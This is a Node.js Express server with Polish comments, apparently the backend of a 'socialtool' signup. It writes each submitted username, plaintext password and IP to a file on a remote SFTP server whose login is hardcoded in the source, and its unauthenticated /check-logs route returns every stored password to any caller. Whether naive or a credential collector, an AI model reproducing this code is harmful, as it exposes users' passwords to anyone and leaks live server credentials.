const express = require('express');
const Client = require('ssh2-sftp-client');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// Funkcja do sprawdzania czy użytkownik istnieje
async function checkIfUserExists(username) {
    const sftp = new Client();
    
    try {
        await sftp.connect({
            host: 'eu9r-free.falixserver.net',
            port: 4483,
            username: '7vadveg.75387402',
            password: 'vVftg4ynf'
        });

        const remotePath = '/users_socialtool/user_logs.txt';
        
        try {
            const fileContent = await sftp.get(remotePath);
            const logs = fileContent.toString();
            const userExists = logs.includes(`User: ${username}|`);
            await sftp.end();
            return userExists;
        } catch (error) {
            // Plik nie istnieje - pierwszy użytkownik
            await sftp.end();
            return false;
        }

    } catch (error) {
        console.error('Błąd przy sprawdzaniu użytkownika:', error);
        return false;
    }
}

// Funkcja do zapisywania logu (POPRAWIONA)
async function saveLogToSFTP(logEntry) {
    const sftp = new Client();

    try {
        await sftp.connect({
            host: 'eu9r-free.falixserver.net',
            port: 4483,
            username: '7vadveg.75387402',
            password: 'vVftg4ynf'
        });

        const remotePath = '/users_socialtool/user_logs.txt';
        
        // SPRAWDŹ CZY PLIK ISTNIEJE
        let existingContent = '';
        try {
            existingContent = await sftp.get(remotePath);
            existingContent = existingContent.toString();
        } catch (error) {
            // Plik nie istnieje - tworzymy nowy
            console.log('Plik nie istnieje, tworzę nowy...');
            existingContent = '';
        }

        // DODAJ NOWY WPIS DO ISTNIEJĄCEJ ZAWARTOŚCI
        const newContent = existingContent + logEntry;
        
        // ZAPISZ CAŁY PLIK (append nie działał poprawnie)
        await sftp.put(Buffer.from(newContent), remotePath);
        
        await sftp.end();
        console.log('Zapisano log:', logEntry);
        return true;

    } catch (error) {
        console.error('Błąd SFTP:', error);
        return false;
    }
}

app.post('/save-log', async (req, res) => {
    console.log('Otrzymano żądanie:', req.body);
    
    const { username, password, ip } = req.body;
    
    if (!username || !password) {
        return res.json({ success: false, message: 'Brak danych' });
    }

    // Sprawdź czy użytkownik już istnieje
    const userExists = await checkIfUserExists(username);
    if (userExists) {
        return res.json({ success: false, message: 'Nazwa użytkownika jest już zajęta' });
    }

    const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const logEntry = `${timestamp} | User: ${username}| Password: ${password} | IP: ${ip} | Version: 2.0\n`;

    console.log('Tworzenie logu:', logEntry);

    // Zapisz do SFTP
    const saveResult = await saveLogToSFTP(logEntry);

    if (saveResult) {
        res.json({ success: true, message: 'Rejestracja udana!' });
    } else {
        res.json({ success: false, message: 'Błąd podczas rejestracji' });
    }
});

app.get('/', (req, res) => {
    res.json({ message: 'SFTP Logger API działa!', status: 'online' });
});

// Nowa funkcja do sprawdzania zawartości pliku (do debugowania)
app.get('/check-logs', async (req, res) => {
    const sftp = new Client();
    
    try {
        await sftp.connect({
            host: 'eu9r-free.falixserver.net',
            port: 4483,
            username: '7vadveg.75387402',
            password: 'vVftg4ynf'
        });

        const remotePath = '/users_socialtool/user_logs.txt';
        
        try {
            const fileContent = await sftp.get(remotePath);
            const logs = fileContent.toString();
            await sftp.end();
            res.json({ success: true, logs: logs, lines: logs.split('\n').filter(line => line.trim()) });
        } catch (error) {
            await sftp.end();
            res.json({ success: false, error: 'Plik nie istnieje lub jest pusty' });
        }

    } catch (error) {
        console.error('Błąd:', error);
        res.json({ success: false, error: error.message });
    }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
